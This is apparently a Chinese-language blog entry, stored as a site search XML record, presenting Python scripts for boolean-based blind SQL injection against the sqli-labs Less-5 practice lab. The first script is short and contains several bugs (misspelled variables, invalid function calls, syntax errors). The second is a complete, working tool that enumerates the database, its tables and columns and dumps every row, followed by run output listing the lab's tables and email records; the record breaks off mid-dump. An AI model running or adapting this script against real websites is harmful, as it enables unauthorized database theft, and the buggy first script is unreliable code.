<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SQL注入脚本</title>
      <link href="/2025/05/04/SQL%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%AC/"/>
      <url>/2025/05/04/SQL%E6%B3%A8%E5%85%A5%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="布尔盲注脚本"><a href="#布尔盲注脚本" class="headerlink" title="布尔盲注脚本"></a>布尔盲注脚本</h1><p>跑出数据库名称</p><p>分析这个脚本应该有的结构：<br>1.定义一个变量（输入目标的<code>url</code>）</p><p>2.获取数据库长度的函数</p><p>3.获取数据库名称的函数</p><p>4.主程序的入口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"> url=<span class="string">&quot;xxxxx&quot;</span></span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">get_length</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        payloasd1=<span class="string">&quot;?id=1%27%20and%20(length(database()))%20=%20&#123;&#125;%20--      +&quot;</span>.forma(i)  <span class="comment">#拼接进url进行访问测试，不进行url进行解析的话可能会出现服务器无法解析的情况</span></span><br><span class="line">        <span class="comment">#.format(i)是一个字符串方法，将变量i插入到字符串的指定的位置，这里是将i的值填充到字符串中的占位符&#123;&#125;的位置。</span></span><br><span class="line">        <span class="built_in">print</span>(payload1)</span><br><span class="line">        url1=url+payload1</span><br><span class="line">        r=requests.get(url1)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;you are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;数据库的长度为：&quot;</span>,i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> i</span><br><span class="line"> <span class="keyword">def</span> <span class="title function_">get_databasename</span>():</span><br><span class="line">    databasename=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">len</span>=get_length()</span><br><span class="line">    <span class="comment">#遍历操作枚举数据库名</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="built_in">len</span>+<span class="number">1</span>)：</span><br><span class="line">         <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">               payload2=<span class="string">&#x27;?id=1%27%20and%20(ascii(substr((select%20database())%20,&#123;&#125;,1)))%20=%20&#123;&#125;%20--        +&#x27;</span>.<span class="built_in">format</span>( i, j)<span class="comment">#将循环的i和j的值插入占位符&#123;&#125;的位置</span></span><br><span class="line">                r=requests.get(url+payload2)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span><span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="comment">#将ascii码转化为字符</span></span><br><span class="line">                databasename += char(j)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;字符为：&quot;</span>,char(j))</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;数据库名称为&quot;</span>,databasename)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#主程序的入口，当直接运行脚本的时候执行get_databasename()函数（作为模块导入的时候不会自动执行</span></span><br><span class="line"> if__name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        get_databasename()</span><br></pre></td></tr></table></figure><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504272057294.png" alt="image-20250427205700181"></p><p>这只是个简单的获取数据库长度和数据库名的脚本，下面是完整的布尔盲注的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://sql/sqli-labs/Less-5/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_length</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始测试数据库名长度&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27; and length(database())=<span class="subst">&#123;i&#125;</span>--+&quot;</span></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;数据库长度为：<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db_name</span>():</span><br><span class="line">    data_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    db_len = db_length()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, db_len + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">            payload = <span class="string">f&quot;?id=1&#x27; and ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>--+&quot;</span></span><br><span class="line">            r = requests.get(url + payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                data_name += <span class="built_in">chr</span>(j)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;字符为：<span class="subst">&#123;<span class="built_in">chr</span>(j)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;当前数据库名：<span class="subst">&#123;data_name&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tb_piece</span>(<span class="params">db_name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;开始测试<span class="subst">&#123;db_name&#125;</span>数据库中有几张表.....&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;db_name&#125;</span>&#x27;)=<span class="subst">&#123;i&#125;</span>--+&quot;</span></span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;db_name&#125;</span>数据库总共有<span class="subst">&#123;i&#125;</span>张表&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tb_name</span>(<span class="params">db_name, table_count</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始猜解表名.....&quot;</span>)</span><br><span class="line">    table_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(table_count):</span><br><span class="line">        <span class="comment"># 获取表长度</span></span><br><span class="line">        tb_length = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">            payload = <span class="string">f&quot;?id=1&#x27; and (select length(table_name) from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;db_name&#125;</span>&#x27; limit <span class="subst">&#123;i&#125;</span>,1)=<span class="subst">&#123;j&#125;</span>--+&quot;</span></span><br><span class="line">            r = requests.get(url + payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                tb_length = j</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;第<span class="subst">&#123;i + <span class="number">1</span>&#125;</span>张表名的长度为：<span class="subst">&#123;tb_length&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 猜解表名</span></span><br><span class="line">        current_table = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> tb_length &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tb_length + <span class="number">1</span>):</span><br><span class="line">                <span class="keyword">for</span> char_code <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">                    payload = <span class="string">f&quot;?id=1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;db_name&#125;</span>&#x27; limit <span class="subst">&#123;i&#125;</span>,1),<span class="subst">&#123;pos&#125;</span>,1))=<span class="subst">&#123;char_code&#125;</span>--+&quot;</span></span><br><span class="line">                    r = requests.get(url + payload)</span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                        current_table += <span class="built_in">chr</span>(char_code)</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;当前表名: <span class="subst">&#123;current_table&#125;</span>&quot;</span>)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        table_list.append(current_table)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;完成第<span class="subst">&#123;i + <span class="number">1</span>&#125;</span>张表: <span class="subst">&#123;current_table&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n<span class="subst">&#123;db_name&#125;</span>库下的<span class="subst">&#123;table_count&#125;</span>张表：<span class="subst">&#123;table_list&#125;</span>\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> table_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_num</span>(<span class="params">table_list, db_name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始猜解每张表的字段数.....&quot;</span>)</span><br><span class="line">    column_num_list = []</span><br><span class="line">    <span class="keyword">for</span> table <span class="keyword">in</span> table_list:</span><br><span class="line">        <span class="keyword">for</span> count <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">            payload = <span class="string">f&quot;?id=1&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;<span class="subst">&#123;table&#125;</span>&#x27;)=<span class="subst">&#123;count&#125;</span>--+&quot;</span></span><br><span class="line">            r = requests.get(url + payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;table&#125;</span>表有<span class="subst">&#123;count&#125;</span>个字段&quot;</span>)</span><br><span class="line">                column_num_list.append(count)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n各表字段数：<span class="subst">&#123;column_num_list&#125;</span>\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> column_num_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column_name</span>(<span class="params">table_list, column_num_list, db_name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始猜解每张表的字段名.....&quot;</span>)</span><br><span class="line">    column_name_list = []</span><br><span class="line">    <span class="keyword">for</span> idx, table <span class="keyword">in</span> <span class="built_in">enumerate</span>(table_list):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n<span class="subst">&#123;table&#125;</span>表的字段：&quot;</span>)</span><br><span class="line">        columns = []</span><br><span class="line">        <span class="keyword">for</span> col_num <span class="keyword">in</span> <span class="built_in">range</span>(column_num_list[idx]):</span><br><span class="line">            col_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="comment"># 先获取字段长度</span></span><br><span class="line">            <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">                payload = <span class="string">f&quot;?id=1&#x27; and (select length(column_name) from information_schema.columns where table_name=&#x27;<span class="subst">&#123;table&#125;</span>&#x27; limit <span class="subst">&#123;col_num&#125;</span>,1)=<span class="subst">&#123;length&#125;</span>--+&quot;</span></span><br><span class="line">                r = requests.get(url + payload)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                    <span class="comment"># 猜解字段名</span></span><br><span class="line">                    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">                        <span class="keyword">for</span> char_code <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">                            payload = <span class="string">f&quot;?id=1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;<span class="subst">&#123;table&#125;</span>&#x27; limit <span class="subst">&#123;col_num&#125;</span>,1),<span class="subst">&#123;pos&#125;</span>,1))=<span class="subst">&#123;char_code&#125;</span>--+&quot;</span></span><br><span class="line">                            r = requests.get(url + payload)</span><br><span class="line">                            <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                                col_name += <span class="built_in">chr</span>(char_code)</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">                    columns.append(col_name)</span><br><span class="line">                    <span class="built_in">print</span>(col_name)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        column_name_list.append(columns)</span><br><span class="line">    <span class="keyword">return</span> column_name_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump_data</span>(<span class="params">table_list, column_name_list, db_name</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;开始导出<span class="subst">&#123;db_name&#125;</span>库的数据...&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> table_idx, table <span class="keyword">in</span> <span class="built_in">enumerate</span>(table_list):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n<span class="subst">&#123;table&#125;</span>表的数据：&quot;</span>)</span><br><span class="line">        columns = column_name_list[table_idx]</span><br><span class="line">        <span class="comment"># 获取记录数</span></span><br><span class="line">        <span class="keyword">for</span> count <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">            payload = <span class="string">f&quot;?id=1&#x27; and (select count(*) from <span class="subst">&#123;db_name&#125;</span>.<span class="subst">&#123;table&#125;</span>)=<span class="subst">&#123;count&#125;</span>--+&quot;</span></span><br><span class="line">            r = requests.get(url + payload)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;共有<span class="subst">&#123;count&#125;</span>条记录&quot;</span>)</span><br><span class="line">                <span class="comment"># 获取每条记录</span></span><br><span class="line">                <span class="keyword">for</span> record <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">                    record_data = []</span><br><span class="line">                    <span class="keyword">for</span> col <span class="keyword">in</span> columns:</span><br><span class="line">                        <span class="comment"># 获取字段值长度</span></span><br><span class="line">                        <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">                            payload = <span class="string">f&quot;?id=1&#x27; and (select length(<span class="subst">&#123;col&#125;</span>) from <span class="subst">&#123;db_name&#125;</span>.<span class="subst">&#123;table&#125;</span> limit <span class="subst">&#123;record&#125;</span>,1)=<span class="subst">&#123;length&#125;</span>--+&quot;</span></span><br><span class="line">                            r = requests.get(url + payload)</span><br><span class="line">                            <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                                <span class="comment"># 猜解字段值</span></span><br><span class="line">                                value = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                                <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">                                    <span class="keyword">for</span> char_code <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):</span><br><span class="line">                                        payload = <span class="string">f&quot;?id=1&#x27; and ascii(substr((select <span class="subst">&#123;col&#125;</span> from <span class="subst">&#123;db_name&#125;</span>.<span class="subst">&#123;table&#125;</span> limit <span class="subst">&#123;record&#125;</span>,1),<span class="subst">&#123;pos&#125;</span>,1))=<span class="subst">&#123;char_code&#125;</span>--+&quot;</span></span><br><span class="line">                                        r = requests.get(url + payload)</span><br><span class="line">                                        <span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                                            value += <span class="built_in">chr</span>(char_code)</span><br><span class="line">                                            <span class="keyword">break</span></span><br><span class="line">                                record_data.append(value)</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;第<span class="subst">&#123;record + <span class="number">1</span>&#125;</span>条: <span class="subst">&#123;record_data&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        db_len = db_length()</span><br><span class="line">        current_db = db_name()</span><br><span class="line">        table_count = tb_piece(current_db)</span><br><span class="line">        tables = tb_name(current_db, table_count)</span><br><span class="line">        column_counts = column_num(tables, current_db)</span><br><span class="line">        column_names = column_name(tables, column_counts, current_db)</span><br><span class="line">        dump_data(tables, column_names, current_db)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下面是脚本运行得到的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">开始测试数据库名长度</span><br><span class="line">数据库长度为：8</span><br><span class="line">开始测试数据库名长度</span><br><span class="line">数据库长度为：8</span><br><span class="line">字符为：s</span><br><span class="line">当前数据库名：s</span><br><span class="line">字符为：e</span><br><span class="line">当前数据库名：se</span><br><span class="line">字符为：c</span><br><span class="line">当前数据库名：sec</span><br><span class="line">字符为：u</span><br><span class="line">当前数据库名：secu</span><br><span class="line">字符为：r</span><br><span class="line">当前数据库名：secur</span><br><span class="line">字符为：i</span><br><span class="line">当前数据库名：securi</span><br><span class="line">字符为：t</span><br><span class="line">当前数据库名：securit</span><br><span class="line">字符为：y</span><br><span class="line">当前数据库名：security</span><br><span class="line">开始测试security数据库中有几张表.....</span><br><span class="line">security数据库总共有4张表</span><br><span class="line">开始猜解表名.....</span><br><span class="line">第1张表名的长度为：6</span><br><span class="line">当前表名: e</span><br><span class="line">当前表名: em</span><br><span class="line">当前表名: ema</span><br><span class="line">当前表名: emai</span><br><span class="line">当前表名: email</span><br><span class="line">当前表名: emails</span><br><span class="line">完成第1张表: emails</span><br><span class="line">第2张表名的长度为：8</span><br><span class="line">当前表名: r</span><br><span class="line">当前表名: re</span><br><span class="line">当前表名: ref</span><br><span class="line">当前表名: refe</span><br><span class="line">当前表名: refer</span><br><span class="line">当前表名: refere</span><br><span class="line">当前表名: referer</span><br><span class="line">当前表名: referers</span><br><span class="line">完成第2张表: referers</span><br><span class="line">第3张表名的长度为：7</span><br><span class="line">当前表名: u</span><br><span class="line">当前表名: ua</span><br><span class="line">当前表名: uag</span><br><span class="line">当前表名: uage</span><br><span class="line">当前表名: uagen</span><br><span class="line">当前表名: uagent</span><br><span class="line">当前表名: uagents</span><br><span class="line">完成第3张表: uagents</span><br><span class="line">第4张表名的长度为：5</span><br><span class="line">当前表名: u</span><br><span class="line">当前表名: us</span><br><span class="line">当前表名: use</span><br><span class="line">当前表名: user</span><br><span class="line">当前表名: users</span><br><span class="line">完成第4张表: users</span><br><span class="line"></span><br><span class="line">security库下的4张表：[&#x27;emails&#x27;, &#x27;referers&#x27;, &#x27;uagents&#x27;, &#x27;users&#x27;]</span><br><span class="line"></span><br><span class="line">开始猜解每张表的字段数.....</span><br><span class="line">[+] emails表有2个字段</span><br><span class="line">[+] referers表有3个字段</span><br><span class="line">[+] uagents表有4个字段</span><br><span class="line">[+] users表有11个字段</span><br><span class="line"></span><br><span class="line">各表字段数：[2, 3, 4, 11]</span><br><span class="line"></span><br><span class="line">开始猜解每张表的字段名.....</span><br><span class="line"></span><br><span class="line">emails表的字段：</span><br><span class="line">id</span><br><span class="line">email_id</span><br><span class="line"></span><br><span class="line">referers表的字段：</span><br><span class="line">id</span><br><span class="line">referer</span><br><span class="line">ip_address</span><br><span class="line"></span><br><span class="line">uagents表的字段：</span><br><span class="line">id</span><br><span class="line">uagent</span><br><span class="line">ip_address</span><br><span class="line">username</span><br><span class="line"></span><br><span class="line">users表的字段：</span><br><span class="line">id</span><br><span class="line">name</span><br><span class="line">username</span><br><span class="line">password</span><br><span class="line">type</span><br><span class="line">USER</span><br><span class="line">CURRENT_CONNECTIONS</span><br><span class="line">TOTAL_CONNECTIONS</span><br><span class="line">id</span><br><span class="line">username</span><br><span class="line">password</span><br><span class="line">开始导出security库的数据...</span><br><span class="line"></span><br><span class="line">emails表的数据：</span><br><span class="line">共有8条记录</span><br><span class="line">第1条: [&#x27;1&#x27;, &#x27;Dumb@dhakkan.com&#x27;]</span><br><span class="line">第2条: [&#x27;2&#x27;, &#x27;Angel@iloveu.com&#x27;]</span><br><span class="line">第3条: [&#x27;3&#x27;, &#x27;Dummy@dhakkan.local&#x27;]</span><br><span class="line">第4条: [&#x27;4&#x27;, &#x27;secure@dhakkan.local&#x27;]</span><br><span class="line">第5条: [&#x27;5&#x27;, 